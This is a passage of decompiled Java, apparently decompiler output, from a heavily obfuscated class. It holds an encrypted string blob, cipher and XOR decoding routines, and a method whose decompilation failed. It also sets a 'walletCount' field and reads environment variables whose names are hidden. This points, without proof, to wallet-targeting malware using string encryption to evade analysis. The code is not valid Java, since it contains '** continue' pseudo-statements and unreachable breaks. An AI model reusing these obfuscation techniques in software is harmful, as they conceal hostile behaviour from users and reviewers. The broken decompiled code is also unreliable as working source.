                                            var5_5 = "u\u00aa\u00b9\u00f4\u0001\u00eeb\u00eeI\u00f4%\u00f4\u00ff\u00e5+y\u00b8)\u0016\u008b\u0085\u00ee?(0\u00fa\u00ec\u0083\u001c\u0011=\u000b\u00ba\u008d\u00bd\u00fam\u00b5\u00b6\u0089\u008a\u00e908^\u0090\u0011\u00d7\u00ee\u0080|\u00b5\u00a0\u00da{\u00cc\u00d7\"I\u00c7\u00a1L\u00be\u000e\u00c8e\u0000\u00d1r\u001dT\u0091'\u00c3@\u0080\u00a5\u0018\u00ca\u00bd\u00f2\u0005\u00dd$\u00ab\u0000~\u00b8\u001a\u0081\u00e6\u00f9\u00aeIG\u00b5[\u0087E\u00c26\u00f7g\u009f\u00af\u00ef\u00ad_\u00a79\u00e3U@\u00918\u00ee\u00dc9-2\u009c\u00e9\u0085j\u0015\u00ae\u0098\u00b3\u00e7s\u00ba\u00dcR\u009c^\u00c9\u00e6CdK\u00a4\u00db\u00c4\u00c4\u009e\u00d6\u001f\u00cd+\b\u00c2vvf`\u0001\u00c1e[\u0089x\u0083\u008b\u0081&\u00b5\u0017D\u0095\u0005\u00a6\u00f3.\u00b4,i\u00bc\u0092\u00a1\u00ab[\u00c1\u00f9\u00d3b\u00e5\u00c0\u00d9\u008f\u00df\u00c7\u008bg\u00af\u00d3\u0016\u0017t\u0012%\n\u00e4d\u0001\u00b1(4\bX\u00e2l\u00bc\rj\u00c5\u0087\u0002\u0004\u00ebW\u0000Q\u00e8q\u00d4\u00a0\u00a4\u00ad\u00ec\u00e3,\u00ad\u00d59\u00d7\u00d9\u0010:\u0001\u00ee\u00dd\u00a0K\u00c4B\u001b|A\u00cdlw?\u00e1@\u00c0\u000b\u00bf\n\u00e1\u0099\u00bf\u00cad\u001aM\u00ba\u0006\u0017\u00bb\u00bf\u00d2\u00f5\u00a7{\u00a0]\u00d6{\u00cbI\u00e0\u00f4\u00bbCBn\t\u009f\u00b5Sb\u00af\u00ab\u00ec\u0084\u001f\u0097$I]\u00f3&\u0081)\u000eG\u00b5\u0080\u0016\u00e4\u00b5\u001e\u00c5\u00edl\f\u009bq\u00edS\u00e7\u00eeQ\u0087\u00c4\u00f1\u00fd\u0013-\u00c9\r\u00e7\u0019\u00dc\u0088p\u00ff\u0004\u00c7\u00865C\u00f2o\u0007FK\u00e1\u0002I\u00b0z5\u00134\u00841\u00ccHHa\u00ab\u00deB\u00c51u\u0094\roO\u009e\u0089\u00fc\u00a4\u00bc\u007f\u00ee\u00cd.\u00dd\u0017K\u00be\u00ee^\u0014\u0091dF\u00dd\u00ad\u00bb\"\u001d\u00c9\u00fd\u00aa\u0014\u0086\u001bw\u00a0Q\u00cbqF\u0092\u001d\u00b2\u00a8\u00d0~\fC\u00c2\u00d0\u008d!\u000eR5\u00afj\u00e9\u00bf\u00e5i\u00e6S;\u00bf\u00cf\u00f2\u0017\u00e9\u00b8\u0002c\u00cf|\u000e\u008a/\b\u00f0\u0088\u00f0&\u00aa\u00ce\u00b4I\u00ae\u0002i\u00fb\u0086\u00ec\u000b[\u00da\u00ba\u000b\u00d8^\u001em\u0013\u00dc[\u0006b\u00e9\u00e61\u00b9/\u0083\u00e0b~\u00f8\u00da\u00cdDj|\u008fs\u00ea\u00cc\b\u00d0\u0085\u00ec\u008a\n\u00daY\u001f\u00c86\u00f3\u00ad\u0093\u0014\u00b2W\u0005\u00e9\u00d2\u0085s%\u0082\u00c2\t$\u00f8{\u00f3\u009f\u00b0C\u00e0\u0099\u00fe\u00bf\u00ec\u00a64\u00bb\u00b1]1O\u00be\u00a8\u0086\u00fe\u00c7\u0096\u0099*P\u00f9\u00b6\u00c3\u00b7Sp\u00ef\u00d35\u00bes\u00ff6\u00e4.7\u00ab\u00b8\u0094oF\u00e7 \u0084\u00c8\u00d1\u00cbzC\u009e\u00c6)\u0000\u00c5T\u00eb\u00ad\u009e\u00af\u00fa\u0084d0#4\u0011\u00d3khu\nK\u00ea\u0083\f\u0091\u0095k\u00d0\u0087\u00e7\u0083\u00fd\u0094\"\u00b9\u0083H\u00e2n\u0097\u00a8(\u0083\u00cb\u00c5\u00ff=\u0016\"s\u00ad\u00f3\u00ed\u00013;\u0004\u00b4\u00ce\u00ca\u007fGN\u00b2\u00bc\u00e1\u00d3\u00a4\u00c8+\u00cd\u00e8\u0010\u001d.Q?\u00a5\u00ae%^\u0082L\u00f4\u00b5\u009c\u00f8\u0006\u0019\u0099\u0018h\u00fd\u0097\u00a1\u001d\u00b7\u0018\u008e\u00a9\u00cb+\u001aUn\u00a3\u001b=\u00ef\u00a9\u0002e\u0093l\u00cb\u0085\u008d\u00e9\u00d2TS\u008b\u00a2\u00b4\nEL\u008a\u00a5 &1\u00c2\u00a5\u0096h\u00f3\u00ad\u00bb\u0016\u0003\u00fcGRO+\u00e3]8\u0003g\u00bc`#c\u0091\u00a4/-\u00a1\u008c\u00b5\u00eaK\u00b1\u00df;\u008b\u00aeUf\u0014\u00c8J\u00f5\u00f5\u000f+\u00eb7\u000b\u00ac\u00cf\u00d3\u00fb\u00c2\u00b1_\u00cc\u00e5\u00bd\u0010\u00e7\u00ed>\u00c1\"\u009a\u009d\u00b8\u00ae\u00bd?\u00d4\rM \u00bf\u00a9w\u00bf\u00d8\u00d45\t\u00d55*z\u0015\u00f2@\u00c46\u00b6\u00a9\u009bF\u00d2S\u0012\u00dd\u00b0\u001ak6\u00d7\u00aaJRA_U\u0097\u0000\u00e7\u00d9\u007f\u00c9\u008b\u0097y\u009c\u00fe:jbZ\u00e9\u00dar\u00een Bg\u0099p\u0094\u0099HP\u001e6\u0017\u00ae9\u000b\u009aT\u0018\"\u00e0^\u000e\u00cc\u00cb\r\u0004x\u00bf6\u00eap\r\r";
                                            var7_6 = "u\u00aa\u00b9\u00f4\u0001\u00eeb\u00eeI\u00f4%\u00f4\u00ff\u00e5+y\u00b8)\u0016\u008b\u0085\u00ee?(0\u00fa\u00ec\u0083\u001c\u0011=\u000b\u00ba\u008d\u00bd\u00fam\u00b5\u00b6\u0089\u008a\u00e908^\u0090\u0011\u00d7\u00ee\u0080|\u00b5\u00a0\u00da{\u00cc\u00d7\"I\u00c7\u00a1L\u00be\u000e\u00c8e\u0000\u00d1r\u001dT\u0091'\u00c3@\u0080\u00a5\u0018\u00ca\u00bd\u00f2\u0005\u00dd$\u00ab\u0000~\u00b8\u001a\u0081\u00e6\u00f9\u00aeIG\u00b5[\u0087E\u00c26\u00f7g\u009f\u00af\u00ef\u00ad_\u00a79\u00e3U@\u00918\u00ee\u00dc9-2\u009c\u00e9\u0085j\u0015\u00ae\u0098\u00b3\u00e7s\u00ba\u00dcR\u009c^\u00c9\u00e6CdK\u00a4\u00db\u00c4\u00c4\u009e\u00d6\u001f\u00cd+\b\u00c2vvf`\u0001\u00c1e[\u0089x\u0083\u008b\u0081&\u00b5\u0017D\u0095\u0005\u00a6\u00f3.\u00b4,i\u00bc\u0092\u00a1\u00ab[\u00c1\u00f9\u00d3b\u00e5\u00c0\u00d9\u008f\u00df\u00c7\u008bg\u00af\u00d3\u0016\u0017t\u0012%\n\u00e4d\u0001\u00b1(4\bX\u00e2l\u00bc\rj\u00c5\u0087\u0002\u0004\u00ebW\u0000Q\u00e8q\u00d4\u00a0\u00a4\u00ad\u00ec\u00e3,\u00ad\u00d59\u00d7\u00d9\u0010:\u0001\u00ee\u00dd\u00a0K\u00c4B\u001b|A\u00cdlw?\u00e1@\u00c0\u000b\u00bf\n\u00e1\u0099\u00bf\u00cad\u001aM\u00ba\u0006\u0017\u00bb\u00bf\u00d2\u00f5\u00a7{\u00a0]\u00d6{\u00cbI\u00e0\u00f4\u00bbCBn\t\u009f\u00b5Sb\u00af\u00ab\u00ec\u0084\u001f\u0097$I]\u00f3&\u0081)\u000eG\u00b5\u0080\u0016\u00e4\u00b5\u001e\u00c5\u00edl\f\u009bq\u00edS\u00e7\u00eeQ\u0087\u00c4\u00f1\u00fd\u0013-\u00c9\r\u00e7\u0019\u00dc\u0088p\u00ff\u0004\u00c7\u00865C\u00f2o\u0007FK\u00e1\u0002I\u00b0z5\u00134\u00841\u00ccHHa\u00ab\u00deB\u00c51u\u0094\roO\u009e\u0089\u00fc\u00a4\u00bc\u007f\u00ee\u00cd.\u00dd\u0017K\u00be\u00ee^\u0014\u0091dF\u00dd\u00ad\u00bb\"\u001d\u00c9\u00fd\u00aa\u0014\u0086\u001bw\u00a0Q\u00cbqF\u0092\u001d\u00b2\u00a8\u00d0~\fC\u00c2\u00d0\u008d!\u000eR5\u00afj\u00e9\u00bf\u00e5i\u00e6S;\u00bf\u00cf\u00f2\u0017\u00e9\u00b8\u0002c\u00cf|\u000e\u008a/\b\u00f0\u0088\u00f0&\u00aa\u00ce\u00b4I\u00ae\u0002i\u00fb\u0086\u00ec\u000b[\u00da\u00ba\u000b\u00d8^\u001em\u0013\u00dc[\u0006b\u00e9\u00e61\u00b9/\u0083\u00e0b~\u00f8\u00da\u00cdDj|\u008fs\u00ea\u00cc\b\u00d0\u0085\u00ec\u008a\n\u00daY\u001f\u00c86\u00f3\u00ad\u0093\u0014\u00b2W\u0005\u00e9\u00d2\u0085s%\u0082\u00c2\t$\u00f8{\u00f3\u009f\u00b0C\u00e0\u0099\u00fe\u00bf\u00ec\u00a64\u00bb\u00b1]1O\u00be\u00a8\u0086\u00fe\u00c7\u0096\u0099*P\u00f9\u00b6\u00c3\u00b7Sp\u00ef\u00d35\u00bes\u00ff6\u00e4.7\u00ab\u00b8\u0094oF\u00e7 \u0084\u00c8\u00d1\u00cbzC\u009e\u00c6)\u0000\u00c5T\u00eb\u00ad\u009e\u00af\u00fa\u0084d0#4\u0011\u00d3khu\nK\u00ea\u0083\f\u0091\u0095k\u00d0\u0087\u00e7\u0083\u00fd\u0094\"\u00b9\u0083H\u00e2n\u0097\u00a8(\u0083\u00cb\u00c5\u00ff=\u0016\"s\u00ad\u00f3\u00ed\u00013;\u0004\u00b4\u00ce\u00ca\u007fGN\u00b2\u00bc\u00e1\u00d3\u00a4\u00c8+\u00cd\u00e8\u0010\u001d.Q?\u00a5\u00ae%^\u0082L\u00f4\u00b5\u009c\u00f8\u0006\u0019\u0099\u0018h\u00fd\u0097\u00a1\u001d\u00b7\u0018\u008e\u00a9\u00cb+\u001aUn\u00a3\u001b=\u00ef\u00a9\u0002e\u0093l\u00cb\u0085\u008d\u00e9\u00d2TS\u008b\u00a2\u00b4\nEL\u008a\u00a5 &1\u00c2\u00a5\u0096h\u00f3\u00ad\u00bb\u0016\u0003\u00fcGRO+\u00e3]8\u0003g\u00bc`#c\u0091\u00a4/-\u00a1\u008c\u00b5\u00eaK\u00b1\u00df;\u008b\u00aeUf\u0014\u00c8J\u00f5\u00f5\u000f+\u00eb7\u000b\u00ac\u00cf\u00d3\u00fb\u00c2\u00b1_\u00cc\u00e5\u00bd\u0010\u00e7\u00ed>\u00c1\"\u009a\u009d\u00b8\u00ae\u00bd?\u00d4\rM \u00bf\u00a9w\u00bf\u00d8\u00d45\t\u00d55*z\u0015\u00f2@\u00c46\u00b6\u00a9\u009bF\u00d2S\u0012\u00dd\u00b0\u001ak6\u00d7\u00aaJRA_U\u0097\u0000\u00e7\u00d9\u007f\u00c9\u008b\u0097y\u009c\u00fe:jbZ\u00e9\u00dar\u00een Bg\u0099p\u0094\u0099HP\u001e6\u0017\u00ae9\u000b\u009aT\u0018\"\u00e0^\u000e\u00cc\u00cb\r\u0004x\u00bf6\u00eap\r\r".length();
                                            var4_7 = 840;
                                            var3_8 = -1;
lbl33:
                                            // 2 sources

                                            while (true) {
                                                v6 = ++var3_8;
                                                v4 = var5_5.substring(v6, v6 + var4_7);
                                                v5 = 0;
                                                break block41;
                                                break;
                                            }
                                            break;
                                        }
lbl38:
                                        // 1 sources

                                        while (true) {
                                            var0_3[var6_4++] = w.b(var8_9).intern();
                                            if ((var3_8 += var4_7) < var7_6) {
                                                var4_7 = var5_5.charAt(var3_8);
                                                ** continue;
                                            }
                                            break block42;
                                            break;
                                        }
                                    }
                                    var8_9 = var1_1.doFinal(v4.getBytes("ISO-8859-1"));
                                    switch (v5) {
                                        default: {
                                            ** continue;
                                        }
                                        ** case 0:
lbl50:
                                        // 1 sources

                                        ** continue;
                                    }
                                }
                                var26_10 = new String[61];
                                var24_11 = 0;
                                var23_12 = var0_3[2];
                                var25_13 = var23_12.length();
                                var22_14 = 5;
                                var21_15 = -1;
lbl58:
                                // 2 sources

                                while (true) {
                                    v7 = 122;
                                    v8 = ++var21_15;
                                    v9 = var23_12.substring(v8, v8 + var22_14);
                                    v10 = -1;
                                    break block43;
                                    break;
                                }
lbl64:
                                // 1 sources

                                while (true) {
                                    var26_10[var24_11++] = v11.intern();
                                    if ((var21_15 += var22_14) < var25_13) {
                                        var22_14 = var23_12.charAt(var21_15);
                                        ** continue;
                                    }
                                    var23_12 = var0_3[1];
                                    var25_13 = var23_12.length();
                                    var22_14 = 6;
                                    var21_15 = -1;
lbl73:
                                    // 2 sources

                                    while (true) {
                                        v7 = 45;
                                        v12 = ++var21_15;
                                        v9 = var23_12.substring(v12, v12 + var22_14);
                                        v10 = 0;
                                        break block43;
                                        break;
                                    }
                                    break;
                                }
lbl79:
                                // 1 sources

                                while (true) {
                                    var26_10[var24_11++] = v11.intern();
                                    if ((var21_15 += var22_14) < var25_13) {
                                        var22_14 = var23_12.charAt(var21_15);
                                        ** continue;
                                    }
                                    break block44;
                                    break;
                                }
                            }
                            v13 = v9.toCharArray();
                            v14 = v13.length;
                            var27_16 = 0;
                            try {
                                v15 = v7;
                                v16 = v13;
                                v17 = v14;
                                if (v14 > 1) break block45;
lbl97:
                                // 2 sources

                                while (true) {
                                    v18 = v15;
                                    v16 = v16;
                                    v19 = v16;
                                    v20 = v15;
                                    v21 = var27_16;
                                    break;
                                }
                            }
                            catch (RuntimeException v22) {
                                throw w.b(v22);
                            }
                            while (true) {
                                switch (var27_16 % 7) {
                                    case 0: {
                                        v23 = 14;
                                        break;
                                    }
                                    case 1: {
                                        v23 = 68;
                                        break;
                                    }
                                    case 2: {
                                        v23 = 79;
                                        break;
                                    }
                                    case 3: {
                                        v23 = 19;
                                        break;
                                    }
                                    case 4: {
                                        v23 = 9;
                                        break;
                                    }
                                    case 5: {
                                        v23 = 46;
                                        break;
                                    }
                                    default: {
                                        v23 = 2;
                                    }
                                }
                                try {
                                    v19[v21] = (char)(v19[v21] ^ (v20 ^ v23));
                                    ++var27_16;
                                    v15 = v18;
                                    if (v18 != 0) break;
                                    v18 = v15;
                                    v16 = v16;
                                    v21 = v15;
                                    v19 = v16;
                                    v20 = v15;
                                }
                                catch (RuntimeException v24) {
                                    throw w.b(v24);
                                }
                            }
                        }
                        v25 = v16;
                        v17 = v17;
                        ** while (v17 > var27_16)
lbl148:
                        // 1 sources

                        v11 = new String(v25);
                        switch (v10) {
                            default: {
                                ** continue;
                            }
                            ** case 0:
lbl155:
                            // 1 sources

                            ** continue;
                        }
                    }
                    w.A = var26_10;
                    w.t = new String[61];
                    var13_17 = 6282748056423881472L;
                    var19_18 = new long[32];
                    var16_19 = 0;
                    var17_20 = var0_3[0];
                    var18_21 = var17_20.length();
                    var15_22 = 0;
                    while (true) {
                        var20_23 = var17_20.substring(var15_22, var15_22 += 8).getBytes("ISO-8859-1");
                        v26 = var19_18;
                        v27 = var16_19++;
                        v28 = ((long)var20_23[0] & 255L) << 56 | ((long)var20_23[1] & 255L) << 48 | ((long)var20_23[2] & 255L) << 40 | ((long)var20_23[3] & 255L) << 32 | ((long)var20_23[4] & 255L) << 24 | ((long)var20_23[5] & 255L) << 16 | ((long)var20_23[6] & 255L) << 8 | (long)var20_23[7] & 255L;
                        v29 = -1;
                        break block46;
                        break;
                    }
lbl172:
                    // 1 sources

                    while (true) {
                        v26[v27] = v30;
                        if (var15_22 < var18_21) ** continue;
                        var17_20 = var0_3[3];
                        var18_21 = var17_20.length();
                        var15_22 = 0;
                        while (true) {
                            var20_23 = var17_20.substring(var15_22, var15_22 += 8).getBytes("ISO-8859-1");
                            v26 = var19_18;
                            v27 = var16_19++;
                            v28 = ((long)var20_23[0] & 255L) << 56 | ((long)var20_23[1] & 255L) << 48 | ((long)var20_23[2] & 255L) << 40 | ((long)var20_23[3] & 255L) << 32 | ((long)var20_23[4] & 255L) << 24 | ((long)var20_23[5] & 255L) << 16 | ((long)var20_23[6] & 255L) << 8 | (long)var20_23[7] & 255L;
                            v29 = 0;
                            break block46;
                            break;
                        }
                        break;
                    }
lbl185:
                    // 1 sources

                    while (true) {
                        v26[v27] = v30;
                        if (var15_22 < var18_21) ** continue;
                        break block47;
                        break;
                    }
                }
                v30 = v28 ^ var13_17;
                switch (v29) {
                    default: {
                        ** continue;
                    }
                    ** case 0:
lbl196:
                    // 1 sources

                    ** continue;
                }
            }
            w.a = var19_18;
            w.b = new Integer[32];
            break block48;
lbl201:
            // 1 sources

            while (true) {
                continue;
                break;
            }
        }
        var11_24 = 3499297442405971962L;
        ** while (true)
        w.S = 3499297442405969962L ^ var11_24;
        w.INSTANCE = new w();
        w.walletCount = 0;
        w.f = System.getenv(w.I(31428, 8115));
        w.Z = System.getenv(w.I(31440, -20712));
        w.Y = new x();
        w.c = new d();
    }

    private static Throwable U(Throwable throwable) {
        return throwable;
    }

    /*
     * Exception decompiling
     */
    private static String I(int var0, int var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static int a(int n2, long l2) {
        Integer n3;
        block4: {
            int n4;
            block5: {
                u[] uArray = o.Z();
                n4 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x7433;
                try {
                    try {
                        n3 = b[n4];
                        if (uArray == null) break block4;
                        if (n3 != null) break block5;
                    }
                    catch (RuntimeException runtimeException) {
                        throw w.b(runtimeException);
                    }
                    w.b[n4] = (int)(a[n4] ^ l2);
                }
                catch (RuntimeException runtimeException) {
                    throw w.b(runtimeException);
                }
            }
            n3 = b[n4];
        }
        return n3;
    }

    private static Throwable b(Throwable throwable) {
        return throwable;
    }

    private static String b(byte[] byArray) {
        int n2 = 0;
        int n3 = byArray.length;
        char[] cArray = new char[n3];
        for (int i2 = 0; i2 < n3; ++i2) {
            char c2;
            int n4 = 0xFF & byArray[i2];
            if (n4 < 192) {
                cArray[n2++] = (char)n4;
                continue;
            }
            if (n4 < 224) {
                c2 = (char)((char)(n4 & 0x1F) << 6);
                n4 = byArray[++i2];
                c2 = (char)(c2 | (char)(n4 & 0x3F));
                cArray[n2++] = c2;
                continue;
            }
            if (i2 >= n3 - 2) continue;
            c2 = (char)((char)(n4 & 0xF) << 12);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F) << 6);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F));
            cArray[n2++] = c2;
        }
        return new String(cArray, 0, n2);
    }
}

